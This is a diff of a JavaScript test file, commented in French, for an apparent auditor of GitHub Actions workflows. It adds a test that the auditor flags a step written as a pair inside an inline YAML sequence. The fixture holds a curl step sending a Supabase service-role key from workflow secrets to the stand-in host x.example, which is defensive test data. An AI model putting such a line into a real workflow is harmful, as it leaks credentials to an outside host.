@@ -95,6 +95,11 @@ test("ASTRA-52 ⑦ une forme YAML inconnue n'est JAMAIS certifiée sûre : ancre
   }
   const { manques: m, erreurs } = auditer([{ nom: "t.yml", texte: "on: &a\n  pull_request:\n" }]);
   assert.ok(erreurs.length >= 1 || m.length >= 1);
+  // PR #920 (relecture du 15/11) : une étape écrite en paire d'une séquence en ligne est un mapping pour YAML. Rendue
+  // comme un texte, elle sortait de la lecture des étapes, et la clé qu'elle porte avec.
+  const enLigne = "on: pull_request\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps: [ run: 'curl -H \"apikey: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}\" https://x.example' ]\n";
+  const r = auditerTexte("t.yml", enLigne);
+  assert.ok(r.erreurs.length >= 1, "une paire dans une séquence en ligne lève : " + JSON.stringify(r));
 });
 
 test("⑧ sur les workflows RÉELS : tous se lisent, la gate est verte, et les chemins non certifiés sont nommés", () => {
